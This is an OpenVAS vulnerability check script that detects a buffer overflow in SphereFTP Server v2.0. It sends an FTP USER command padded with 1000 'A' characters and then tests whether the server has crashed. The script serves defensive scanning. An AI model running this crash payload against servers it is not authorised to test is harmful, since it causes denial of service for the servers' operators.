###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sphere_ftp_server_bof_vuln.nasl 13494 2019-02-06 10:06:36Z cfischer $
#
# SphereFTP Server Buffer Overflow vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:menasoft:sphereftpserver";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807534");
  script_version("$Revision: 13494 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:06:36 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-04-04 16:23:30 +0530 (Mon, 04 Apr 2016)");
  script_name("SphereFTP Server Buffer Overflow vulnerability");

  script_tag(name:"summary", value:"This host is running SphereFTP server and
  is prone to buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request and check whether
  it is able to crash the application or not.");

  script_tag(name:"insight", value:"Flaw is due to an improper sanitization of
  user supplied input passed via the 'USER' command.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to cause denial of service condition resulting in loss of availability
  for the application.");

  script_tag(name:"affected", value:"SphereFTP Server v2.0, Other versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38072");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("gb_sphere_ftp_server_detect.nasl");
  script_mandatory_keys("SphereFTP Server/installed");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

soc = open_sock_tcp(ftpPort);
if(!soc) exit(0);

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  exit(0);
}

PAYLOAD = crap(data: "A", length:1000);
send(socket:soc, data:string("USER", PAYLOAD, '\r\n'));

ftp_close(socket:soc);

soc = open_sock_tcp(ftpPort);
if(!soc)
{
  security_message(ftpPort);
  exit(0);
}

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  security_message(ftpPort);
  exit(0);
}

ftp_close(socket:soc);
